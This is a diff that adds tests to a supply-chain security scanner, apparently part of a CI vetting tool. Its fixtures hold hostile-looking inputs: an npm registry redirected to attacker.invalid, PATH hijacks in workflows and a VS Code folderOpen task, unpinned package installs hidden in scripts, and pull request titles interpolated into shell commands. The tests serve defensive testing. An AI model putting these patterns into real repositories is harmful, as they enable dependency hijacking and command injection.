@@ -545,6 +545,32 @@ describe('trusted Stage A Git-object scanner', () => {
       incompleteReasons: ['unsupported-toolchain-execution:src/build.ts']
     });
 
+    const npmSpawned = await repo({
+      'src/install.js': [
+        "import { execFileSync } from 'node:child_process';",
+        "execFileSync('npm', ['install', 'untrusted-package@latest']);",
+        ''
+      ].join('\n')
+    });
+    expect(scanGitTree(npmSpawned.root, npmSpawned.sha)).toMatchObject({
+      status: 'incomplete',
+      incompleteReasons: ['unsupported-toolchain-execution:src/install.js']
+    });
+
+    const npmShellCommand = await repo({
+      'src/install.ts': [
+        "import { execSync } from 'node:child_process';",
+        "execSync('npm install untrusted-package@latest');",
+        ''
+      ].join('\n')
+    });
+    expect(
+      scanGitTree(npmShellCommand.root, npmShellCommand.sha)
+    ).toMatchObject({
+      status: 'incomplete',
+      incompleteReasons: ['unsupported-toolchain-execution:src/install.ts']
+    });
+
     const python = await repo({
       'tools/build.py': [
         'import subprocess',
@@ -820,6 +846,7 @@ describe('trusted Stage A Git-object scanner', () => {
     ).toMatchObject({
       status: 'incomplete',
       incompleteReasons: [
+        'local-action-execution-unverified:.github/workflows/ci.yml',
         'workflow-local-action-review',
         'workflow-trust-root-change-review'
       ]
@@ -1302,6 +1329,125 @@ describe('trusted Stage A Git-object scanner', () => {
     ).toBe('approved');
   });
 
+  it('blocks event and action-output expressions wrapped in workflow functions', async () => {
+    const wrappedEvent = await repo({
+      '.github/workflows/event.yml': [
+        'name: event',
+        'on: pull_request',
+        'env:',
+        `  PR_TITLE: "\${{ format('{0}', github.event.pull_request.title) }}"`,
+        'jobs:',
+        '  build:',
+        '    steps:',
+        '      - run: printf "%s" "$PR_TITLE"',
+        ''
+      ].join('\n')
+    });
+    expect(scanGitTree(wrappedEvent.root, wrappedEvent.sha)).toMatchObject({
+      status: 'blocked',
+      findings: ['.github/workflows/event.yml#untrusted-shell-input']
+    });
+
+    const wrappedActionOutput = await repo({
+      '.github/workflows/output.yml': [
+        'name: output',
+        'on: pull_request',
+        'jobs:',
+        '  build:',
+        '    steps:',
+        `      - run: echo "\${{ format('{0}', steps.prepare.outputs.title) }}"`,
+        ''
+      ].join('\n')
+    });
+    expect(
+      scanGitTree(wrappedActionOutput.root, wrappedActionOutput.sha)
+    ).toMatchObject({
+      status: 'blocked',
+      findings: ['.github/workflows/output.yml#untrusted-shell-input']
+    });
+
+    const bracketedContext = await repo({
+      '.github/workflows/bracket.yml': [
+        'name: bracket',
+        'on: pull_request',
+        'jobs:',
+        '  build:',
+        '    steps:',
+        `      - run: echo "\${{ format('{0}', github['event']['pull_request']['title']) }}"`,
+        ''
+      ].join('\n')
+    });
+    expect(
+      scanGitTree(bracketedContext.root, bracketedContext.sha)
+    ).toMatchObject({
+      status: 'blocked',
+      findings: [
+        '.github/workflows/bracket.yml#untrusted-event-shell-interpolation',
+        '.github/workflows/bracket.yml#untrusted-shell-input'
+      ]
+    });
+
+    const inheritedEvent = await repo({
+      '.github/workflows/inherited.yml': [
+        'name: inherited',
+        'on: pull_request',
+        'env:',
+        `  PR_TITLE: "\${{ format('{0}', github.event.pull_request.title) }}"`,
+        'jobs:',
+        '  build:',
+        '    steps:',
+        '      - run: node scripts/read-env.mjs',
+        ''
+      ].join('\n'),
+      'scripts/read-env.mjs':
+        'process.stdout.write(process.env.PR_TITLE ?? "");\n'
+    });
+    expect(scanGitTree(inheritedEvent.root, inheritedEvent.sha)).toMatchObject({
+      status: 'blocked',
+      findings: ['.github/workflows/inherited.yml#untrusted-shell-input']
+    });
+  });
+
+  it('fails closed on malformed or over-budget workflow expressions', async () => {
+    const fixture = await repo({
+      '.github/workflows/malformed.yml': [
+        'name: malformed',
+        'on: pull_request',
+        'jobs:',
+        '  build:',
+        '    steps:',
+        '      - run: echo "${{ github.event.pull_request.title"',
+        ''
+      ].join('\n')
+    });
+    expect(scanGitTree(fixture.root, fixture.sha)).toMatchObject({
+      status: 'blocked',
+      incompleteReasons: [
+        'workflow-expression-coverage-incomplete:.github/workflows/malformed.yml'
+      ]
+    });
+
+    const oversizedExpression = await repo({
+      '.github/workflows/oversized.yml': [
+        'name: oversized',
+        'on: pull_request',
+        'jobs:',
+        '  build:',
+        '    steps:',
+        `      - run: echo "\${{ ${'x'.repeat(4097)} }}"`,
+        ''
+      ].join('\n')
+    });
+    expect(
+      scanGitTree(oversizedExpression.root, oversizedExpression.sha)
+    ).toMatchObject({
+      status: 'blocked',
+      incompleteReasons: [
+        'workflow-expression-coverage-incomplete:.github/workflows/oversized.yml'
+      ]
+    });
+  });
+
   it('fails closed on malformed changed workflow YAML', async () => {
     const fixture = await repo({
       '.github/workflows/build.yml': [
@@ -1675,6 +1821,496 @@ describe('trusted Stage A Git-object scanner', () => {
         inspectDependencyChanges(fixture.root, fixture.sha, fixture.sha).reasons
       ).toContain('unsupported-lockfile-format');
     }
+  });
+
+  it('marks npm lock overrides and unsupported Python and Ruby build inputs incomplete', async () => {
+    const manifest = { name: 'root', version: '1.0.0' };
+    const lock = {
+      name: 'root',
+      version: '1.0.0',
+      lockfileVersion: 3,
+      packages: {
+        '': { name: 'root', version: '1.0.0' }
+      }
+    };
+    const fixture = await repo({
+      'package.json': JSON.stringify(manifest),
+      'package-lock.json': JSON.stringify(lock),
+      'npm-shrinkwrap.json': JSON.stringify(lock),
+      'bun.lock': 'lockfileVersion = 1\n',
+      'bun.lockb': Buffer.from([0, 1, 2, 3]),
+      'pyproject.toml': '[build-system]\nrequires = ["setuptools"]\n',
+      'requirements.in': 'example>=1\n',
+      Gemfile: "source 'https://rubygems.org'\ngem 'example'\n",
+      'Gemfile.lock': 'GEM\n  specs:\n    example (1.0.0)\n',
+      'app.gemspec': "Gem::Specification.new { |spec| spec.name = 'app' }\n",
+      '.bundle/config': 'BUNDLE_PATH: vendor/bundle\n'
+    });
+
+    const result = inspectDependencyChanges(
+      fixture.root,
+      fixture.sha,
+      fixture.sha
+    );
+
+    expect(result.reasons).toContain('unsupported-lockfile-format');
+    expect(result.reasons).toContain(
+      'unsupported-dependency-ecosystem-provenance'
+    );
+  });
+
+  it('marks unmodeled Deno, Pipenv, PDM and .NET execution incomplete', async () => {
+    const fixture = await repo({
+      'package.json': JSON.stringify({
+        name: 'root',
+        version: '1.0.0',
+        scripts: {
+          deno: 'deno task build',
+          pipenv: 'pipenv sync',
+          pdm: 'pdm install',
+          dotnet: 'dotnet test'
+        }
+      })
+    });
+    expect(scanGitTree(fixture.root, fixture.sha)).toMatchObject({
+      status: 'incomplete',
+      incompleteReasons: [
+        'unsupported-toolchain-execution:package.json#scripts.deno',
+        'unsupported-toolchain-execution:package.json#scripts.dotnet',
+        'unsupported-toolchain-execution:package.json#scripts.pdm',
+        'unsupported-toolchain-execution:package.json#scripts.pipenv'
+      ]
+    });
+  });
+
+  it('marks unsupported resolver configuration and lock inputs incomplete', async () => {
+    const inputs = [
+      ['.cargo/config.toml', '[source.crates-io]\nreplace-with = "mirror"\n'],
+      ['deno.json', '{"tasks":{"build":"deno run build.ts"}}\n'],
+      ['deno.lock', '{"version":3,"remote":{}}\n'],
+      ['pdm.lock', 'lock_version = "4.5"\n'],
+      ['pixi.toml', '[workspace]\nname = "fixture"\n'],
+      ['pixi.lock', 'version: 6\n'],
+      ['environment.yml', 'dependencies:\n  - python=3.12\n'],
+      ['vendor/modules.txt', '# example.test/lib v1.2.3\n'],
+      ['gradle/libs.versions.toml', '[versions]\nexample = "1.2.3"\n'],
+      ['gradle.properties', 'systemProp.example=true\n'],
+      ['.mvn/extensions.xml', '<extensions/>\n'],
+      ['.mvn/maven.config', '-s settings.xml\n']
+    ];
+
+    for (const [file, content] of inputs) {
+      const fixture = await repo({ [file]: content });
+      const result = inspectDependencyChanges(
+        fixture.root,
+        fixture.sha,
+        fixture.sha
+      );
+      expect(result.reasons, file).toContain(
+        'unsupported-dependency-ecosystem-provenance'
+      );
+    }
+  });
+
+  it('blocks repository npm registry configuration outside the attested registry policy', async () => {
+    const fixture = await repo({
+      'package.json': JSON.stringify({ name: 'root', version: '1.0.0' }),
+      'package-lock.json': JSON.stringify({
+        name: 'root',
+        version: '1.0.0',
+        lockfileVersion: 3,
+        packages: { '': { name: 'root', version: '1.0.0' } }
+      }),
+      '.npmrc': 'registry=https://packages.attacker.invalid/\n'
+    });
+
+    const result = inspectDependencyChanges(
+      fixture.root,
+      fixture.sha,
+      fixture.sha
+    );
+
+    expect(result.reasons).toContain('unsupported-npm-registry-configuration');
+  });
+
+  it('withholds approval for dynamic shell command resolution', async () => {
+    const packageScript = await repo({
+      'package.json': JSON.stringify({
+        name: 'root',
+        version: '1.0.0',
+        scripts: {
+          pretest: 'PM=npm; "$PM" install untrusted-package@latest',
+          prepack: 'env "$PACKAGE_MANAGER" install untrusted-package@latest'
+        }
+      }),
+      'package-lock.json': JSON.stringify({
+        name: 'root',
+        version: '1.0.0',
+        lockfileVersion: 3,
+        packages: { '': { name: 'root', version: '1.0.0' } }
+      })
+    });
+    const packageScriptResult = scanGitTree(
+      packageScript.root,
+      packageScript.sha
+    );
+    expect(packageScriptResult.status).toBe('incomplete');
+    expect(packageScriptResult.incompleteReasons).toContain(
+      'dynamic-command-resolution:package.json#scripts.pretest'
+    );
+    expect(packageScriptResult.incompleteReasons).toContain(
+      'dynamic-command-resolution:package.json#scripts.prepack'
+    );
+
+    const workflowAlias = await repo({
+      '.github/workflows/install.yml': [
+        'name: install',
+        'on: pull_request',
+        'jobs:',
+        '  test:',
+        '    steps:',
+        '      - run: |',
+        '          alias npm="npm"',
+        '          npm ci --ignore-scripts',
+        ''
+      ].join('\n'),
+      'package.json': JSON.stringify({ name: 'root', version: '1.0.0' }),
+      'package-lock.json': JSON.stringify({
+        name: 'root',
+        version: '1.0.0',
+        lockfileVersion: 3,
+        packages: { '': { name: 'root', version: '1.0.0' } }
+      })
+    });
+    expect(scanGitTree(workflowAlias.root, workflowAlias.sha)).toMatchObject({
+      status: 'incomplete',
+      incompleteReasons: [
+        'dynamic-command-resolution:.github/workflows/install.yml'
+      ]
+    });
+
+    const workflowPath = await repo({
+      '.github/workflows/install.yml': [
+        'name: install',
+        'on: pull_request',
+        'jobs:',
+        '  test:',
+        '    env:',
+        '      PATH: /tmp/untrusted-bin',
+        '    steps:',
+        '      - run: npm ci --ignore-scripts',
+        ''
+      ].join('\n'),
+      'package.json': JSON.stringify({ name: 'root', version: '1.0.0' }),
+      'package-lock.json': JSON.stringify({
+        name: 'root',
+        version: '1.0.0',
+        lockfileVersion: 3,
+        packages: { '': { name: 'root', version: '1.0.0' } }
+      })
+    });
+    expect(scanGitTree(workflowPath.root, workflowPath.sha)).toMatchObject({
+      status: 'incomplete',
+      incompleteReasons: [
+        'dynamic-command-resolution:.github/workflows/install.yml'
+      ]
+    });
+  });
+
+  it('withholds approval when a workflow delegates to an uninspected local action', async () => {
+    const fixture = await repo({
+      '.github/workflows/build.yml': [
+        'name: build',
+        'on: pull_request',
+        'jobs:',
+        '  build:',
+        '    steps:',
+        '      - uses: ./.github/actions/bootstrap',
+        ''
+      ].join('\n'),
+      '.github/actions/bootstrap/action.yml': [
+        'name: bootstrap',
+        'runs:',
+        '  using: composite',
+        '  steps:',
+        '    - run: npm install untrusted-package@latest',
+        ''
+      ].join('\n'),
+      'package.json': JSON.stringify({ name: 'root', version: '1.0.0' }),
+      'package-lock.json': JSON.stringify({
+        name: 'root',
+        version: '1.0.0',
+        lockfileVersion: 3,
+        packages: { '': { name: 'root', version: '1.0.0' } }
+      })
+    });
+
+    expect(scanGitTree(fixture.root, fixture.sha)).toMatchObject({
+      status: 'incomplete',
+      incompleteReasons: [
+        'local-action-execution-unverified:.github/workflows/build.yml'
+      ]
+    });
+  });
+
+  it('marks package manager resolution in a nested shell wrapper incomplete', async () => {
+    const fixture = await repo({
+      'package.json': JSON.stringify({
+        name: 'root',
+        version: '1.0.0',
+        scripts: { pretest: 'bash scripts/bootstrap.sh' }
+      }),
+      'scripts/bootstrap.sh': [
+        '#!/usr/bin/env bash',
+        'set -euo pipefail',
+        'npm install untrusted-package@latest',
+        ''
+      ].join('\n')
+    });
+    expect(scanGitTree(fixture.root, fixture.sha)).toMatchObject({
+      status: 'incomplete',
+      incompleteReasons: ['unverified-npm-resolution:scripts/bootstrap.sh']
+    });
+
+    const extensionless = await repo({
+      'package.json': JSON.stringify({
+        name: 'root',
+        version: '1.0.0',
+        scripts: { pretest: 'bash scripts/bootstrap' }
+      }),
+      'scripts/bootstrap': 'npm install untrusted-package@latest\n'
+    });
+    expect(scanGitTree(extensionless.root, extensionless.sha)).toMatchObject({
+      status: 'incomplete',
+      incompleteReasons: ['unverified-npm-resolution:scripts/bootstrap']
+    });
+  });
+
+  it('withholds approval when automatic editor tasks replace executable lookup paths', async () => {
+    const fixture = await repo({
+      '.vscode/tasks.json': JSON.stringify({
+        version: '2.0.0',
+        tasks: [
+          {
+            label: 'open workspace',
+            runOptions: { runOn: 'folderOpen' },
+            command: 'npm',
+            args: ['run', 'build'],
+            options: { env: { PATH: '/tmp/untrusted-bin' } }
+          }
+        ]
+      }),
+      'package.json': JSON.stringify({
+        name: 'root',
+        version: '1.0.0',
+        scripts: { build: 'echo safe' }
+      })
+    });
+    expect(scanGitTree(fixture.root, fixture.sha)).toMatchObject({
+      status: 'incomplete',
+      incompleteReasons: [
+        'dynamic-command-resolution:.vscode/tasks.json#folderOpen'
+      ]
+    });
+  });
+
+  it('blocks script-driven package resolution outside the verified Stage A install', async () => {
+    const scriptInstall = await repo({
+      'package.json': JSON.stringify({
+        name: 'root',
+        version: '1.0.0',
+        scripts: {
+          pretest:
+            'npm --workspace packages/app install untrusted-package@latest',
+          prepack: 'cross-env NODE_ENV=test npx untrusted-package@latest'
+        }
+      }),
+      'package-lock.json': JSON.stringify({
+        name: 'root',
+        version: '1.0.0',
+        lockfileVersion: 3,
+        packages: { '': { name: 'root', version: '1.0.0' } }
+      })
+    });
+    const scriptInstallResult = scanGitTree(
+      scriptInstall.root,
+      scriptInstall.sha
+    );
+    expect(scriptInstallResult.status).toBe('incomplete');
+    expect(scriptInstallResult.incompleteReasons).toContain(
+      'unverified-npm-resolution:package.json#scripts.pretest'
+    );
+    expect(scriptInstallResult.incompleteReasons).toContain(
+      'unverified-npm-resolution:package.json#scripts.prepack'
+    );
+
+    const nestedInstall = await repo({
+      '.github/workflows/install.yml': [
+        'name: install',
+        'on: pull_request',
+        'jobs:',
+        '  test:',
+        '    defaults:',
+        '      run:',
+        '        working-directory: packages/app',
+        '    steps:',
+        '      - run: npm ci',
+        ''
+      ].join('\n'),
+      'package.json': JSON.stringify({ name: 'root', version: '1.0.0' }),
+      'package-lock.json': JSON.stringify({
+        name: 'root',
+        version: '1.0.0',
+        lockfileVersion: 3,
+        packages: { '': { name: 'root', version: '1.0.0' } }
+      }),
+      'packages/app/package.json': JSON.stringify({
+        name: 'app',
+        version: '1.0.0',
+        dependencies: { untrusted: '^1.0.0' }
+      })
+    });
+    expect(scanGitTree(nestedInstall.root, nestedInstall.sha)).toMatchObject({
+      status: 'incomplete',
+      incompleteReasons: [
+        'unverified-npm-resolution:.github/workflows/install.yml'
+      ]
+    });
+
+    const rootCi = await repo({
+      '.github/workflows/install.yml': [
+        'name: install',
+        'on: pull_request',
+        'jobs:',
+        '  test:',
+        '    steps:',
+        '      - run: |',
+        '          set -euo pipefail',
+        '          npm ci --ignore-scripts',
+        ''
+      ].join('\n'),
+      'package.json': JSON.stringify({ name: 'root', version: '1.0.0' }),
+      'package-lock.json': JSON.stringify({
+        name: 'root',
+        version: '1.0.0',
+        lockfileVersion: 3,
+        packages: { '': { name: 'root', version: '1.0.0' } }
+      })
+    });
+    expect(scanGitTree(rootCi.root, rootCi.sha).status).toBe('approved');
+
+    const lifecycleEnabledInstall = await repo({
+      '.github/workflows/install.yml': [
+        'name: install',
+        'on: pull_request',
+        'jobs:',
+        '  test:',
+        '    steps:',
+        '      - run: npm ci',
+        ''
+      ].join('\n'),
+      'package.json': JSON.stringify({ name: 'root', version: '1.0.0' }),
+      'package-lock.json': JSON.stringify({
+        name: 'root',
+        version: '1.0.0',
+        lockfileVersion: 3,
+        packages: { '': { name: 'root', version: '1.0.0' } }
+      })
+    });
+    expect(
+      scanGitTree(lifecycleEnabledInstall.root, lifecycleEnabledInstall.sha)
+    ).toMatchObject({
+      status: 'incomplete',
+      incompleteReasons: [
+        'unverified-npm-resolution:.github/workflows/install.yml'
+      ]
+    });
+
+    const registryOverride = await repo({
+      '.github/workflows/install.yml': [
+        'name: install',
+        'on: pull_request',
+        'jobs:',
+        '  test:',
+        '    steps:',
+        '      - run: npm ci --ignore-scripts --registry=https://attacker.invalid/',
+        ''
+      ].join('\n'),
+      'package.json': JSON.stringify({ name: 'root', version: '1.0.0' }),
+      'package-lock.json': JSON.stringify({
+        name: 'root',
+        version: '1.0.0',
+        lockfileVersion: 3,
+        packages: { '': { name: 'root', version: '1.0.0' } }
+      })
+    });
+    expect(
+      scanGitTree(registryOverride.root, registryOverride.sha)
+    ).toMatchObject({
+      status: 'incomplete',
+      incompleteReasons: [
+        'unverified-npm-resolution:.github/workflows/install.yml'
+      ]
+    });
+
+    const environmentRegistryOverride = await repo({
+      '.github/workflows/install.yml': [
+        'name: install',
+        'on: pull_request',
+        'jobs:',
+        '  test:',
+        '    steps:',
+        '      - run: NPM_CONFIG_REGISTRY=https://attacker.invalid/ npm ci --ignore-scripts',
+        ''
+      ].join('\n'),
+      'package.json': JSON.stringify({ name: 'root', version: '1.0.0' }),
+      'package-lock.json': JSON.stringify({
+        name: 'root',
+        version: '1.0.0',
+        lockfileVersion: 3,
+        packages: { '': { name: 'root', version: '1.0.0' } }
+      })
+    });
+    expect(
+      scanGitTree(
+        environmentRegistryOverride.root,
+        environmentRegistryOverride.sha
+      )
+    ).toMatchObject({
+      status: 'incomplete',
+      incompleteReasons: [
+        'unverified-npm-resolution:.github/workflows/install.yml'
+      ]
+    });
+
+    const workflowEnvRegistry = await repo({
+      '.github/workflows/install.yml': [
+        'name: install',
+        'on: pull_request',
+        'jobs:',
+        '  test:',
+        '    steps:',
+        '      - run: npm ci --ignore-scripts',
+        '        env:',
+        '          npm_config_registry: https://attacker.invalid/',
+        ''
+      ].join('\n'),
+      'package.json': JSON.stringify({ name: 'root', version: '1.0.0' }),
+      'package-lock.json': JSON.stringify({
+        name: 'root',
+        version: '1.0.0',
+        lockfileVersion: 3,
+        packages: { '': { name: 'root', version: '1.0.0' } }
+      })
+    });
+    expect(
+      scanGitTree(workflowEnvRegistry.root, workflowEnvRegistry.sha)
+    ).toMatchObject({
+      status: 'incomplete',
+      incompleteReasons: [
+        'unverified-npm-resolution:.github/workflows/install.yml'
+      ]
+    });
   });
 
   it('withholds Stage A approval when a non-npm ecosystem lacks verified artifact provenance', async () => {
